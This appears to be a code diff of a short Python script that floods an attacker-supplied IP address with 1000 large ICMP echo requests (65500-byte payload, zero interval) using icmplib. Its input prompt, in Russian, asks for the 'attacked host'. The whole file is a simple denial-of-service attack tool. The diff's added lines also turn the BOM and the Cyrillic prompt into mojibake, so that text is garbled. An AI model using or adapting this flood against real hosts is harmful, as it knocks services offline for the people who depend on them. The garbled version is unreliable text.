@@ -1,9 +1,8 @@
-# -*- coding: cp1251 -*-
-import asyncio
+п»їimport asyncio
 from icmplib import async_ping
 
 async def is_alive(address):
     host = await async_ping(address, count=1000, interval=0, payload_size=65500)
     return host
 
-asyncio.run(is_alive(str(input('IP-адрес атакуемого хоста: '))))
+asyncio.run(is_alive(str(input('IP-Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))))
